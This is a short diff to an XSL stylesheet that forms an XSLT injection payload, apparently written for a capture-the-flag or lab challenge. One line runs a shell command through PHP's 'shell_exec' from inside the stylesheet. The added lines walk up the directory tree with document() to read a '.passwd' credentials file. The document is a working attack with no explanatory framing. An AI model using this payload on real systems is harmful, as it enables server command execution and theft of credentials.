@@ -4,7 +4,12 @@
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <p>
         <xsl:value-of select="system-property('xsl:vendor')"/>
-	    <xsl:value-of select="php:function('shell_exec', 'ls')" />
+	<xsl:value-of select="php:function('shell_exec', 'ls')" />
+	<xsl:copy-of select="document('.passwd')"/>
+	<xsl:copy-of select="document('../.passwd')"/>
+	<xsl:copy-of select="document('../../.passwd')"/>
+	<xsl:copy-of select="document('../../../.passwd')"/>
+	<xsl:copy-of select="document('../../../../.passwd')"/>	
     </p>
 </body>
 </html> 
